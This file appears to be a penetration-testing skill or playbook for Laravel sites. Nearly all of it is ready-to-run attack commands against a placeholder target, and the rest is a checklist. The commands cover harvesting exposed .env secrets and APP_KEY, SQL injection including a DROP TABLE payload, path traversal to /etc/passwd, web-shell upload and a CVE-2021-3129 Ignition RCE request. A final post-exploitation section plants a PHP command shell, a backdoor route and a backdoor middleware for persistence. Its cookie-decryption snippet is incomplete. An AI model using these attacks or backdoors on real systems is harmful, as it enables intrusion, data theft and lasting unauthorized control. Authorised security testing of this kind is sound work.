---
name: laravel
description: Laravel framework security testing - common vulnerabilities, misconfigurations, and Laravel-specific attacks
---

# Laravel Framework Security

## Fingerprinting

### Identify Laravel
```bash
# Check headers
curl -I https://target.com | grep -i "x-powered-by\|server"

# Check for Laravel markers
curl -s https://target.com | grep -i "laravel\|csrf-token"

# Check for Laravel error page
curl -s https://target.com/nonexistent | grep -i "laravel\|ignition\|whoops"

# Check for Laravel routes
curl -s https://target.com/login
curl -s https://target.com/register
```

### Version Detection
```bash
# Check composer.json (if exposed)
curl -s https://target.com/composer.json | jq '.require["laravel/framework"]'

# Check for version in error page (if APP_DEBUG=true)
curl -s https://target.com/nonexistent | grep -o "Laravel v[0-9.]*"

# Check cookies
curl -I https://target.com | grep -i "set-cookie" | grep -i "laravel_session"
```

## Common Vulnerabilities

### 1. Debug Mode Enabled (APP_DEBUG=true)

**Exposed sensitive information**
```bash
# Trigger error page
curl -s https://target.com/nonexistent

# Extract sensitive information
curl -s https://target.com/nonexistent | grep -iE "(database|password|secret|api_key|aws)"

# Check for Ignition (Laravel 8+)
curl -s https://target.com/_ignition/health-check

# Check for Whoops (older Laravel)
curl -s https://target.com/nonexistent | grep -i "whoops"
```

### 2. Exposed .env File
```bash
# Try to access .env file
curl -s https://target.com/.env

# Extract sensitive information
curl -s https://target.com/.env | grep -E "DB_|APP_KEY|MAIL_|AWS_|REDIS_"

# Common .env locations
curl -s https://target.com/.env.backup
curl -s https://target.com/.env.production
curl -s https://target.com/.env.local
```

### 3. APP_KEY Exposure
```bash
# If .env is exposed, extract APP_KEY
curl -s https://target.com/.env | grep "APP_KEY"

# Use APP_KEY to decrypt session cookies
python3 -c "
from Crypto.Cipher import AES
import base64
import json

app_key = 'base64:extracted_app_key'
session_cookie = 'encrypted_session_cookie'

# Decode APP_KEY
key = base64.b64decode(app_key.split(':')[1])

# Decrypt session
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted_session)
print(decrypted)
"
```

### 4. Mass Assignment
```bash
# Test for mass assignment
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "attacker", "email": "attacker@evil.com", "is_admin": true}'

# Test for hidden field manipulation
curl -X POST https://target.com/profile/update \
  -d "_token=csrf_token&name=user&email=user@target.com&role=admin"
```

### 5. SQL Injection

**Laravel Query Builder bypass**
```bash
# Test for raw SQL queries
curl "https://target.com/api/users?search=admin' OR '1'='1"
curl "https://target.com/api/users?id=1 UNION SELECT 1,2,3,4,5--"

# Test for whereRaw injection
curl "https://target.com/api/users?order=id;DROP TABLE users--"

# Test for DB::raw injection
curl "https://target.com/api/users?filter=1' OR 1=1--"
```

### 6. Insecure Direct Object References (IDOR)
```bash
# Test for IDOR in API routes
curl https://target.com/api/users/1
curl https://target.com/api/users/2
curl https://target.com/api/users/admin

# Test for IDOR with UUIDs
curl https://target.com/api/users/550e8400-e29b-41d4-a716-446655440000

# Test for IDOR in nested resources
curl https://target.com/api/users/1/orders
curl https://target.com/api/users/2/orders
```

### 7. CSRF Token Bypass
```bash
# Check if CSRF protection is enabled
curl -I https://target.com/login | grep -i "csrf"

# Test for CSRF token bypass
curl -X POST https://target.com/api/update \
  -H "X-CSRF-TOKEN: invalid" \
  -d "data=test"

# Test for CSRF via subdomain
# If target.com has CSRF protection, check if subdomain.target.com can bypass it
```

## Laravel-Specific Attacks

### 1. Ignition RCE (CVE-2021-3129)
```bash
# Check if Ignition is enabled
curl -s https://target.com/_ignition/health-check

# Exploit Ignition RCE (Laravel <= 8.4.2)
curl -X POST https://target.com/_ignition/execute-solution \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "test",
      "viewFile": "php://filter/write=convert.base64-decode/resource=storage/logs/laravel.log"
    }
  }'
```

### 2. Laravel Telescope Exposure
```bash
# Check for Telescope (debugging tool)
curl -s https://target.com/telescope
curl -s https://target.com/telescope/requests
curl -s https://target.com/telescope/queries
curl -s https://target.com/telescope/logs

# Extract sensitive information
curl -s https://target.com/telescope/requests | jq '.entries[].content'
```

### 3. Laravel Horizon Exposure
```bash
# Check for Horizon (queue monitoring)
curl -s https://target.com/horizon
curl -s https://target.com/horizon/dashboard
curl -s https://target.com/horizon/jobs
```

### 4. Laravel Filemanager Vulnerabilities
```bash
# Check for Laravel Filemanager
curl -s https://target.com/laravel-filemanager

# Test for file upload vulnerabilities
curl -X POST https://target.com/laravel-filemanager/upload \
  -F "file=@shell.php" \
  -F "working_dir=/"

# Test for path traversal
curl "https://target.com/laravel-filemanager/download?working_dir=/&file=../../../etc/passwd"
```

### 5. Laravel Backup Disclosure
```bash
# Check for exposed backups
curl -s https://target.com/storage/app/backups/
curl -s https://target.com/storage/app/backup.zip
curl -s https://target.com/storage/app/backups/backup-$(date +%Y-%m-%d).zip

# Check for database dumps
curl -s https://target.com/storage/app/database.sql
curl -s https://target.com/storage/app/dump.sql
```

## API Vulnerabilities

### 1. Laravel Sanctum/Passport
```bash
# Test for token vulnerabilities
curl -H "Authorization: Bearer invalid_token" https://target.com/api/user

# Test for token leakage
curl -s https://target.com/api/user | jq '.token'

# Test for token reuse
# Extract token from one user and use it for another
```

### 2. API Rate Limiting Bypass
```bash
# Test for rate limiting
for i in {1..100}; do
  curl -s https://target.com/api/login \
    -d "email=admin@target.com&password=wrong$i"
done

# Test for rate limiting bypass
curl -H "X-Forwarded-For: 1.2.3.4" https://target.com/api/login
curl -H "X-Real-IP: 1.2.3.4" https://target.com/api/login
```

### 3. API Pagination Bypass
```bash
# Test for pagination bypass
curl "https://target.com/api/users?page=1&per_page=1000000"
curl "https://target.com/api/users?limit=1000000"
```

## Testing Checklist

- [ ] Identify Laravel version
- [ ] Check for debug mode (APP_DEBUG=true)
- [ ] Try to access .env file
- [ ] Extract APP_KEY if .env is exposed
- [ ] Test for mass assignment
- [ ] Test for SQL injection (Query Builder bypass)
- [ ] Test for IDOR in API routes
- [ ] Test CSRF protection
- [ ] Check for Ignition RCE (CVE-2021-3129)
- [ ] Check for Telescope exposure
- [ ] Check for Horizon exposure
- [ ] Test Laravel Filemanager vulnerabilities
- [ ] Check for exposed backups
- [ ] Test Laravel Sanctum/Passport vulnerabilities
- [ ] Test API rate limiting
- [ ] Test API pagination bypass

## Tools

```bash
# Laravel vulnerability scanner
# https://github.com/0xInfection/LaScan

# SQLMap for Laravel
sqlmap -u "https://target.com/api/users?id=1" --dbms=mysql

# Nuclei templates for Laravel
nuclei -u https://target.com -t ~/nuclei-templates/technologies/laravel/
nuclei -u https://target.com -t ~/nuclei-templates/cves/2021/CVE-2021-3129.yaml

# Laravel exploitation tool
# https://github.com/zhzyker/Laravel-Exploit
```

## Post-Exploitation

### 1. Extract Database Credentials
```bash
# If .env is exposed
curl -s https://target.com/.env | grep -E "DB_|REDIS_|MAIL_"

# Example output:
# DB_CONNECTION=mysql
# DB_HOST=127.0.0.1
# DB_PORT=3306
# DB_DATABASE=laravel
# DB_USERNAME=root
# DB_PASSWORD=password
```

### 2. Create Backdoor
```bash
# If you have file write access, create backdoor
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/public/shell.php

# Access shell
curl "https://target.com/shell.php?cmd=id"
```

### 3. Persistence
```bash
# Add malicious route
echo 'Route::get("/backdoor", function(){ system($_GET["cmd"]); });' >> /var/www/html/routes/web.php

# Add malicious middleware
echo '<?php namespace App\Http\Middleware; class Backdoor { public function handle($request, $next) { if(isset($_GET["cmd"])){system($_GET["cmd"]);} return $next($request); } }' > /var/www/html/app/Http/Middleware/Backdoor.php
```
